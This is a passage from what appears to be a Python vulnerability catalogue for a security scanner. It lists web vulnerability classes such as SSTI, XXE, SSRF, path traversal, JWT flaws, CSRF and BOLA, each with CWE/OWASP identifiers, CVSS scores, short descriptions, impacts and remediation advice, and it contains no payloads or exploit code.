         cwe="CWE-1336", owasp="A03:2021-Injection", capec="CAPEC-242", av=AttackVector.NETWORK,
         desc="User input is embedded directly into a template string (Jinja2, Twig, Freemarker, Velocity) before rendering, allowing template syntax evaluation, often escalating to full RCE via language builtins.",
         impact="Remote code execution, sensitive configuration disclosure, and full server compromise.",
         rec="Never mix user input with template source; pass user data only as template variables/context.",
         tags=["ssti","injection","rce"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="ssti"),
    dict(id="LDAPI-001", title="LDAP Injection", aliases=["LDAP Injection Attack"],
         category=Category.INJECTION, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-90", owasp="A03:2021-Injection", capec="CAPEC-136", av=AttackVector.NETWORK,
         desc="Unsanitised input is embedded into an LDAP filter/query, allowing manipulation of filter logic to bypass authentication or enumerate directory contents.",
         impact="Authentication bypass against LDAP-backed login, and disclosure of directory attributes.",
         rec="Use parameterised LDAP APIs or strict escaping of special filter characters per RFC 4515.",
         tags=["ldap","injection"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="ldap"),
    dict(id="XPATHI-001", title="XPath Injection", aliases=["XPath Injection Attack"],
         category=Category.INJECTION, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-643", owasp="A03:2021-Injection", capec="CAPEC-83", av=AttackVector.NETWORK,
         desc="Unsanitised input is concatenated into an XPath query, allowing filter logic manipulation analogous to SQL injection.",
         impact="Authentication bypass and disclosure of arbitrary XML document contents.",
         rec="Use parameterised XPath queries (XQuery variable bindings) and validate input against an expected format.",
         tags=["xpath","injection","xml"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="xpath"),
    dict(id="CRLFI-001", title="CRLF Injection", aliases=["Carriage Return Line Feed Injection"],
         category=Category.INJECTION, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-93", owasp="A03:2021-Injection", capec="CAPEC-105", av=AttackVector.NETWORK,
         desc="User input containing unencoded CR/LF sequences is written into an HTTP response or log line, allowing injection of additional headers or forged log entries.",
         impact="HTTP response splitting, session fixation via injected Set-Cookie, and log forging.",
         rec="URL-encode/strip CR and LF characters from any input before writing to headers or logs.",
         tags=["crlf","header-injection"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="crlf"),
    dict(id="HDRI-001", title="HTTP Header Injection", aliases=["Response Splitting"],
         category=Category.INJECTION, severity=Severity.MEDIUM, cvss=6.1, vector="AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
         cwe="CWE-113", owasp="A03:2021-Injection", capec="CAPEC-105", av=AttackVector.NETWORK,
         desc="Attacker-controlled data is reflected directly into a response header value without sanitisation.",
         impact="Cache poisoning, cookie injection, and secondary XSS via body injection after a forged blank line.",
         rec="Validate/allowlist header values, reject embedded CR/LF, and use framework-provided header-setting APIs.",
         tags=["header-injection","http"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="header_injection"),
    dict(id="XXE-001", title="XML External Entity Injection", aliases=["XXE"],
         category=Category.XXE, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
         cwe="CWE-611", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-221", av=AttackVector.NETWORK,
         desc="An XML parser configured with external entity and DTD processing enabled resolves attacker-defined entities, allowing local file disclosure, SSRF, or denial of service.",
         impact="Disclosure of arbitrary local files, internal network SSRF, and resource-exhaustion DoS via recursive entities.",
         rec="Disable DTD processing and external entity resolution in the XML parser configuration.",
         tags=["xxe","xml"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="xxe", related=["XMLBOMB-001"]),
    dict(id="XXE-002", title="Out-of-Band XXE", aliases=["Blind XXE","OOB-XXE"],
         category=Category.XXE, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-611", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-221", av=AttackVector.NETWORK,
         desc="The XML parser resolves an external entity referencing an attacker-controlled server, exfiltrating file contents via an out-of-band channel.",
         impact="Same data exfiltration outcome as classic XXE, confirmed via collaborator callback.",
         rec="Disable external entity resolution entirely; monitor outbound connections from application servers.",
         tags=["xxe","blind","oob"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="xxe"),
    dict(id="SSRF-001", title="Server-Side Request Forgery", aliases=["SSRF"],
         category=Category.SSRF, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
         cwe="CWE-918", owasp="A10:2021-Server-Side Request Forgery", capec="CAPEC-664", av=AttackVector.NETWORK,
         desc="A server-side feature that fetches a URL supplied by the user does not validate the destination, allowing requests to internal-only services or localhost.",
         impact="Access to internal admin panels, cloud metadata services, and internal network reconnaissance.",
         rec="Validate destination host/IP against a strict allowlist, resolve DNS before connecting, and disable unnecessary URL schemes (file, gopher).",
         tags=["ssrf","owasp-top10"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="ssrf", related=["SSRF-002"]),
    dict(id="SSRF-002", title="Cloud Metadata SSRF", aliases=["AWS IMDS SSRF","Metadata Service SSRF"],
         category=Category.SSRF, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
         cwe="CWE-918", owasp="A10:2021-Server-Side Request Forgery", capec="CAPEC-664", av=AttackVector.NETWORK,
         desc="An SSRF primitive is used specifically to reach the cloud instance metadata endpoint (169.254.169.254), retrieving temporary IAM credentials.",
         impact="Theft of cloud IAM credentials enabling lateral movement, frequently escalating to full account takeover.",
         rec="Enforce IMDSv2 on AWS, apply egress filtering blocking link-local range, scope instance IAM roles to least privilege.",
         tags=["ssrf","cloud","aws","critical"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="ssrf"),
    dict(id="LFI-001", title="Local File Inclusion", aliases=["LFI"],
         category=Category.FILE_HANDLING, severity=Severity.HIGH, cvss=8.6, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
         cwe="CWE-98", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-252", av=AttackVector.NETWORK,
         desc="A file path parameter is passed to an include/require or file-read function without validation, allowing traversal and inclusion of arbitrary local files.",
         impact="Disclosure of sensitive configuration/source files and, combined with log/session file poisoning, escalation to RCE.",
         rec="Avoid passing user input to file-inclusion functions; map user selections to a fixed allowlist of file identifiers.",
         tags=["lfi","file-handling"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="lfi", related=["PATHTRAV-001"]),
    dict(id="RFI-001", title="Remote File Inclusion", aliases=["RFI"],
         category=Category.FILE_HANDLING, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-98", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-193", av=AttackVector.NETWORK,
         desc="A file-inclusion function accepts a remote URL, allowing an attacker to host and include a malicious script.",
         impact="Immediate remote code execution; typically exploitable when allow_url_include is enabled.",
         rec="Disable remote URL inclusion at the language/runtime level, and never allow user input to determine an include target.",
         tags=["rfi","file-handling","rce"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="rfi"),
    dict(id="PATHTRAV-001", title="Path Traversal", aliases=["Directory Traversal","Dot-Dot-Slash"],
         category=Category.FILE_HANDLING, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-22", owasp="A01:2021-Broken Access Control", capec="CAPEC-126", av=AttackVector.NETWORK,
         desc="A file path built from user input is not canonicalised/validated before being used to read or write a file, allowing traversal via ../ sequences.",
         impact="Disclosure of arbitrary files readable by the application process, or overwrite of writable files.",
         rec="Canonicalise the resolved path and verify it remains within an intended base directory; reject traversal sequences after normalisation.",
         tags=["path-traversal","file-handling"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="lfi"),
    dict(id="ZIPSLIP-001", title="Zip Slip Archive Extraction Vulnerability", aliases=["Zip Slip"],
         category=Category.FILE_HANDLING, severity=Severity.HIGH, cvss=7.8, vector="AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
         cwe="CWE-22", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-126", av=AttackVector.NETWORK,
         desc="An archive (zip/tar) extraction routine writes entries using the path embedded in the archive without validation, allowing a crafted archive to write files outside the target directory.",
         impact="Arbitrary file write, frequently escalated to RCE by overwriting an executable script or cron job.",
         rec="Validate every extracted entry's resolved path stays within the target directory; use library options that reject traversal entries.",
         tags=["zip-slip","file-handling","archive"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="path_traversal_zip"),
    dict(id="REDIR-001", title="Open Redirect", aliases=["Unvalidated Redirect"],
         category=Category.CLIENT_SIDE, severity=Severity.MEDIUM, cvss=6.1, vector="AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N",
         cwe="CWE-601", owasp="A01:2021-Broken Access Control", capec="CAPEC-593", av=AttackVector.NETWORK,
         desc="A redirect target parameter is used to build a Location header without validating it stays within the trusted domain.",
         impact="Phishing enablement and OAuth token theft when chained with an OAuth redirect_uri flow.",
         rec="Validate redirect targets against an allowlist of relative paths or known domains.",
         tags=["open-redirect","phishing"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="open_redirect"),
    dict(id="CSRF-001", title="Cross-Site Request Forgery", aliases=["CSRF","XSRF"],
         category=Category.AUTH, severity=Severity.HIGH, cvss=8.1, vector="AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
         cwe="CWE-352", owasp="A01:2021-Broken Access Control", capec="CAPEC-62", av=AttackVector.NETWORK,
         desc="A state-changing endpoint relies solely on ambient authentication (cookies) without a per-request unpredictable token.",
         impact="Unauthorized state changes performed as the victim: password/email change, funds transfer, or privilege modification.",
         rec="Implement anti-CSRF tokens validated server-side, set SameSite=Lax/Strict on session cookies, require re-authentication for sensitive actions.",
         tags=["csrf","auth"], confidence="Confirmed", exploit=Exploitability.MODERATE),
    dict(id="IDOR-001", title="Insecure Direct Object Reference", aliases=["IDOR"],
         category=Category.ACCESS_CONTROL, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-639", owasp="A01:2021-Broken Access Control", capec="CAPEC-122", av=AttackVector.NETWORK,
         desc="An endpoint accepts a user-supplied identifier and returns or modifies the referenced object without verifying the requester is authorised to access it.",
         impact="Horizontal privilege escalation exposing other users' private data.",
         rec="Enforce object-level authorization checks on every access, ideally derived from the authenticated session.",
         tags=["idor","access-control","owasp-top10"], confidence="Confirmed", exploit=Exploitability.EASY, related=["BAC-001","BOLA-001"]),
    dict(id="BAC-001", title="Broken Access Control", aliases=["Missing Function Level Access Control"],
         category=Category.ACCESS_CONTROL, severity=Severity.HIGH, cvss=8.1, vector="AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-284", owasp="A01:2021-Broken Access Control", capec="CAPEC-122", av=AttackVector.NETWORK,
         desc="A privileged function is reachable by a lower-privileged or unauthenticated user because the authorization check is missing or only enforced client-side.",
         impact="Vertical privilege escalation up to full administrative control.",
         rec="Centralise authorization decisions in server-side middleware applied by default to every route.",
         tags=["access-control","privilege-escalation"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="AUTH-001", title="Broken Authentication", aliases=["Authentication Bypass"],
         category=Category.AUTH, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-287", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="Flaws in the authentication implementation allow an attacker to bypass or defeat the login process entirely.",
         impact="Full account takeover without valid credentials, potentially including administrative accounts.",
         rec="Use a vetted, well-tested authentication library; apply constant-time credential comparison and enforce consistent checks across every authentication step.",
         tags=["auth","critical"], confidence="Confirmed", exploit=Exploitability.MODERATE),
    dict(id="JWT-001", title="JWT 'alg:none' Signature Bypass", aliases=["JWT None Algorithm"],
         category=Category.AUTH, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-347", owasp="A02:2021-Cryptographic Failures", capec="CAPEC-475", av=AttackVector.NETWORK,
         desc="The JWT verification library accepts tokens with the header alg field set to 'none', skipping signature verification entirely.",
         impact="Forgery of arbitrary JWT claims, resulting in complete authentication and authorization bypass.",
         rec="Explicitly allowlist accepted signing algorithms server-side and reject 'none'.",
         tags=["jwt","auth","critical"], confidence="Confirmed", exploit=Exploitability.EASY, related=["JWT-002"]),
    dict(id="JWT-002", title="JWT Weak/Guessable Signing Secret", aliases=["JWT Weak Secret","JWT Brute-Force"],
         category=Category.AUTH, severity=Severity.HIGH, cvss=8.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-326", owasp="A02:2021-Cryptographic Failures", capec="CAPEC-97", av=AttackVector.NETWORK,
         desc="A JWT is signed with HS256 using a short or dictionary-guessable secret recoverable via offline brute-force.",
         impact="Forgery of arbitrary authenticated sessions once the secret is recovered.",
         rec="Use a high-entropy secret of at least 256 bits generated by a CSPRNG, or migrate to asymmetric signing (RS256/ES256).",
         tags=["jwt","auth","crypto"], confidence="Confirmed", exploit=Exploitability.MODERATE),
    dict(id="SESS-001", title="Session Fixation", aliases=["Session Fixation Attack"],
         category=Category.AUTH, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
         cwe="CWE-384", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-61", av=AttackVector.NETWORK,
         desc="The application accepts a pre-existing session identifier supplied before login and continues using it after successful authentication.",
         impact="An attacker who plants a known session ID can hijack the authenticated session once the victim logs in.",
         rec="Regenerate the session identifier immediately upon privilege change (login, logout, privilege escalation).",
         tags=["session","auth"], confidence="Confirmed", exploit=Exploitability.MODERATE, related=["SESS-002"]),
    dict(id="SESS-002", title="Session Hijacking via Predictable Token", aliases=["Session Hijacking"],
         category=Category.AUTH, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-384", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-593", av=AttackVector.NETWORK,
         desc="Session identifiers are generated using a low-entropy or predictable algorithm, allowing an attacker to guess a valid active session token.",
         impact="Full account takeover of any user whose session token is guessed or intercepted.",
         rec="Generate session identifiers using a CSPRNG with at least 128 bits of entropy, transmitted only over TLS.",
         tags=["session","auth"], confidence="Confirmed", exploit=Exploitability.DIFFICULT),
    dict(id="COOKIE-001", title="Insecure Cookie Configuration", aliases=["Cookie Issues","Missing Secure/HttpOnly Flags"],
         category=Category.AUTH, severity=Severity.MEDIUM, cvss=5.9, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
         cwe="CWE-614", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-31", av=AttackVector.NETWORK,
         desc="Session or sensitive cookies are set without the Secure, HttpOnly, and/or SameSite attributes.",
         impact="Session token theft via network interception or XSS, and increased CSRF exposure.",
         rec="Set Secure, HttpOnly, and SameSite=Lax/Strict on all authentication-related cookies; enforce HSTS.",
         tags=["cookies","session","configuration"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="WEAKPW-001", title="Weak Password Policy", aliases=["Insufficient Password Complexity"],
         category=Category.AUTH, severity=Severity.MEDIUM, cvss=5.3, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
         cwe="CWE-521", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-49", av=AttackVector.NETWORK,
         desc="The application permits weak, short, or commonly-breached passwords with no minimum entropy or breach-list check.",
         impact="Higher success rate for credential-stuffing and password-spraying campaigns.",
         rec="Enforce a minimum length (12+ characters), check new passwords against a breached-password corpus, and rate-limit authentication attempts.",
         tags=["password-policy","auth"], confidence="Confirmed", exploit=Exploitability.MODERATE),
    dict(id="RATELIMIT-001", title="Missing Rate Limiting", aliases=["No Brute-Force Protection"],
         category=Category.AUTH, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
         cwe="CWE-307", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-112", av=AttackVector.NETWORK,
         desc="Authentication, OTP, or password-reset endpoints do not limit the number of attempts, permitting unrestricted brute-force or OTP-guessing attacks.",
         impact="Account takeover via credential stuffing/brute force, or bypass of OTP verification.",
         rec="Apply per-account and per-IP rate limiting with exponential backoff or CAPTCHA after a small number of failed attempts.",
         tags=["rate-limiting","auth","brute-force"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="MFA-001", title="Missing Multi-Factor Authentication", aliases=["Missing MFA"],
         category=Category.AUTH, severity=Severity.MEDIUM, cvss=5.9, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
         cwe="CWE-308", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-49", av=AttackVector.NETWORK,
         desc="No second authentication factor is offered or enforced for sensitive accounts.",
         impact="Reduced defence-in-depth against credential compromise.",
         rec="Offer TOTP/WebAuthn-based MFA and require it for administrative and high-privilege roles.",
         tags=["mfa","auth"], confidence="Confirmed", exploit=Exploitability.THEORETICAL),
    dict(id="OAUTH-001", title="OAuth 2.0 Misconfiguration", aliases=["OAuth Misconfiguration"],
         category=Category.AUTH, severity=Severity.HIGH, cvss=8.1, vector="AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
         cwe="CWE-287", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-114", av=AttackVector.NETWORK,
         desc="An OAuth 2.0 implementation accepts overly permissive redirect_uri values, omits state validation, or uses the implicit grant unnecessarily.",
         impact="Authorization code/token theft and CSRF against the OAuth callback enabling account linking attacks.",
         rec="Strictly allowlist exact redirect_uri values, require and validate a per-request state parameter, prefer authorization code flow with PKCE.",
         tags=["oauth","auth"], confidence="Confirmed", exploit=Exploitability.MODERATE),
    dict(id="CLICKJACK-001", title="Clickjacking", aliases=["UI Redress Attack"],
         category=Category.CLIENT_SIDE, severity=Severity.MEDIUM, cvss=4.3, vector="AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
         cwe="CWE-1021", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-103", av=AttackVector.NETWORK,
         desc="The application does not send X-Frame-Options or a frame-ancestors CSP directive, allowing it to be embedded in an invisible iframe on a malicious page.",
         impact="Forced execution of unintended state-changing actions without the user's awareness.",
         rec="Send X-Frame-Options: DENY/SAMEORIGIN and a Content-Security-Policy frame-ancestors directive scoped to trusted origins only.",
         tags=["clickjacking","headers"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="CORS-001", title="CORS Misconfiguration", aliases=["Insecure CORS Policy"],
         category=Category.CONFIGURATION, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-942", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-141", av=AttackVector.NETWORK,
         desc="The Access-Control-Allow-Origin header reflects an arbitrary requesting origin together with Access-Control-Allow-Credentials: true.",
         impact="Cross-origin theft of authenticated API responses containing sensitive user data.",
         rec="Return an explicit allowlist of trusted origins rather than reflecting the Origin header.",
         tags=["cors","configuration"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="HEADERS-001", title="Missing Security Headers", aliases=["Missing HSTS/CSP/X-Content-Type-Options"],
         category=Category.CONFIGURATION, severity=Severity.LOW, cvss=3.1, vector="AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
         cwe="CWE-693", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-141", av=AttackVector.NETWORK,
         desc="The application omits recommended defence-in-depth headers such as Strict-Transport-Security, Content-Security-Policy, and X-Content-Type-Options.",
         impact="Increases the blast radius of other findings (e.g. XSS without CSP, protocol downgrade without HSTS).",
         rec="Set HSTS with appropriate max-age, a restrictive CSP, and X-Content-Type-Options: nosniff on all responses.",
         tags=["headers","configuration","hardening"], confidence="Confirmed", exploit=Exploitability.THEORETICAL),
    dict(id="TABNAB-001", title="Reverse Tabnabbing", aliases=["Tabnabbing"],
         category=Category.CLIENT_SIDE, severity=Severity.MEDIUM, cvss=4.2, vector="AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
         cwe="CWE-1022", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-593", av=AttackVector.NETWORK,
         desc="Links opened with target=\"_blank\" without rel=\"noopener noreferrer\" give the opened page a window.opener reference to navigate the original tab.",
         impact="Convincing phishing of the original tab's user, potentially harvesting re-entered credentials.",
         rec="Add rel=\"noopener noreferrer\" to all target=\"_blank\" links.",
         tags=["tabnabbing","client-side"], confidence="Confirmed", exploit=Exploitability.MODERATE),
    dict(id="MISCONF-001", title="Security Misconfiguration", aliases=["Default Configuration Left in Production"],
         category=Category.CONFIGURATION, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-16", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-217", av=AttackVector.NETWORK,
         desc="Framework or platform default settings not intended for production remain enabled.",
         impact="Ranges from information disclosure through to full RCE via an exposed debug console.",
         rec="Maintain a hardened configuration baseline applied consistently across environments.",
         tags=["configuration","hardening"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="INFODISC-001", title="Sensitive Information Disclosure", aliases=["Information Leakage"],
         category=Category.INFO_DISCLOSURE, severity=Severity.MEDIUM, cvss=5.3, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
         cwe="CWE-200", owasp="A01:2021-Broken Access Control", capec="CAPEC-116", av=AttackVector.NETWORK,
         desc="A response, header, or file exposes internal implementation details, PII, or credentials not necessary for legitimate function.",
         impact="Aids further attack planning or directly exposes sensitive data.",
         rec="Apply a response-field allowlist for API output; strip internal identifiers/stack details before returning to the client.",
         tags=["information-disclosure"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="VERBERR-001", title="Verbose Error Messages / Stack Trace Disclosure", aliases=["Verbose Errors"],
         category=Category.INFO_DISCLOSURE, severity=Severity.MEDIUM, cvss=5.3, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
         cwe="CWE-209", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-54", av=AttackVector.NETWORK,
         desc="Unhandled exceptions return a full stack trace, database error, or internal path information directly to the client.",
         impact="Discloses backend technology, file paths, and query structure that assist further attacks.",
         rec="Configure production error handling to return generic messages to clients while logging full details server-side.",
         tags=["information-disclosure","error-handling"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="DIRLIST-001", title="Directory Listing Enabled", aliases=["Directory Listing"],
         category=Category.INFO_DISCLOSURE, severity=Severity.MEDIUM, cvss=5.3, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
         cwe="CWE-548", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-127", av=AttackVector.NETWORK,
         desc="The web server returns an auto-generated file listing for a directory with no index file.",
         impact="Disclosure of backup files, source code, or configuration files.",
         rec="Disable directory listing at the web server configuration level (Options -Indexes / autoindex off).",
         tags=["information-disclosure","configuration"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="DEBUGEP-001", title="Exposed Debug Endpoint", aliases=["Debug Endpoints","Debug Mode Enabled"],
         category=Category.CONFIGURATION, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-489", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-217", av=AttackVector.NETWORK,
         desc="A framework debug console (Werkzeug/Flask debugger, Django DEBUG=True, Spring Boot Actuator without auth) is reachable in production.",
         impact="Full source code and environment variable disclosure; in interactive debugger cases, direct RCE.",
         rec="Ensure debug mode is disabled by default in production, enforced via environment-specific config management.",
         tags=["debug","configuration","rce"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="ADMINPANEL-001", title="Exposed Administrative Interface", aliases=["Admin Panels Exposure"],
         category=Category.CONFIGURATION, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-284", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-127", av=AttackVector.NETWORK,
         desc="An administrative or CMS management interface is reachable from the public internet at a predictable path without network-level restriction.",
         impact="Increases attack surface for credential stuffing and any unauthenticated vulnerabilities in the admin interface.",
         rec="Restrict administrative interfaces to a VPN or allowlisted IP range, and enforce MFA.",
         tags=["admin-panel","configuration"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="UPLOAD-001", title="Unrestricted File Upload", aliases=["File Upload Vulnerability"],
         category=Category.FILE_HANDLING, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-434", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-1", av=AttackVector.NETWORK,
         desc="A file upload feature accepts files of any type/extension and stores them within a web-accessible, executable directory without content validation.",
         impact="Upload of a web shell leading to full remote code execution on the hosting server.",
         rec="Validate file content (magic bytes) rather than extension alone; store uploads outside the web root; serve through a handler forcing safe content-type/disposition.",
         tags=["file-upload","rce","critical"], confidence="Confirmed", exploit=Exploitability.EASY, related=["UPLOAD-002"]),
    dict(id="UPLOAD-002", title="Insufficient File Type / Content Validation", aliases=["Extension Bypass Upload"],
         category=Category.FILE_HANDLING, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
         cwe="CWE-434", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-1", av=AttackVector.NETWORK,
         desc="Client-side or blocklist-based extension checks are bypassed using double extensions, null bytes, or MIME type spoofing.",
         impact="Upload of disguised executable content that a misconfigured server may still execute.",
         rec="Use an allowlist of permitted extensions/MIME types validated against actual file content; disable script execution in the upload directory.",
         tags=["file-upload","validation"], confidence="Confirmed", exploit=Exploitability.MODERATE),
    dict(id="RACE-001", title="Race Condition (TOCTOU)", aliases=["Time-of-Check to Time-of-Use"],
         category=Category.BUSINESS_LOGIC, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
         cwe="CWE-362", owasp="A04:2021-Insecure Design", capec="CAPEC-26", av=AttackVector.NETWORK,
         desc="A sequence of check-then-act operations is not performed atomically, allowing concurrent requests to exploit the window between check and action.",
         impact="Financial loss via double-spend of a coupon/balance, or bypass of a one-time-use limit.",
         rec="Enforce atomicity using database transactions with appropriate isolation or row-level locking.",
         tags=["race-condition","business-logic"], confidence="Confirmed", exploit=Exploitability.MODERATE),
    dict(id="BIZLOGIC-001", title="Business Logic Abuse", aliases=["Business Logic Flaw"],
         category=Category.BUSINESS_LOGIC, severity=Severity.HIGH, cvss=7.1, vector="AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
         cwe="CWE-841", owasp="A04:2021-Insecure Design", capec="CAPEC-210", av=AttackVector.NETWORK,
         desc="An application workflow assumption is violated to obtain an outcome the designers did not intend.",
         impact="Financial loss, unauthorized privilege gain, or workflow bypass specific to the affected feature.",
         rec="Re-validate all business rules and monetary values server-side at every step, independent of client-supplied state.",
         tags=["business-logic"], confidence="Tentative", exploit=Exploitability.MODERATE),
    dict(id="GRAPHQL-001", title="GraphQL Introspection Exposure", aliases=["GraphQL Schema Disclosure"],
         category=Category.API_SECURITY, severity=Severity.MEDIUM, cvss=5.3, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
         cwe="CWE-200", owasp="API8:2023-Security Misconfiguration", capec="CAPEC-116", av=AttackVector.NETWORK,
         desc="The GraphQL endpoint has introspection enabled in production, allowing any client to query the full schema.",
         impact="Reveals the complete API attack surface, easing discovery of further vulnerabilities.",
         rec="Disable introspection in production, or restrict it to authenticated developer-only contexts.",
         tags=["graphql","api","information-disclosure"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="BOLA-001", title="Broken Object Level Authorization (API)", aliases=["BOLA"],
         category=Category.API_SECURITY, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-639", owasp="API1:2023-Broken Object Level Authorization", capec="CAPEC-122", av=AttackVector.NETWORK,
         desc="An API endpoint returns or mutates an object identified by an ID without confirming the caller is authorised to act on it.",
         impact="Cross-tenant data exposure or mutation, the single most common root cause in modern API breaches.",
         rec="Enforce object ownership checks server-side for every object-returning or object-mutating endpoint.",
         tags=["api","bola","access-control"], confidence="Confirmed", exploit=Exploitability.EASY, related=["IDOR-001"]),
    dict(id="EXCESSDATA-001", title="Excessive Data Exposure (API)", aliases=["Over-Fetching API Response"],
         category=Category.API_SECURITY, severity=Severity.MEDIUM, cvss=5.3, vector="AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
         cwe="CWE-213", owasp="API3:2023-Broken Object Property Level Authorization", capec="CAPEC-116", av=AttackVector.NETWORK,
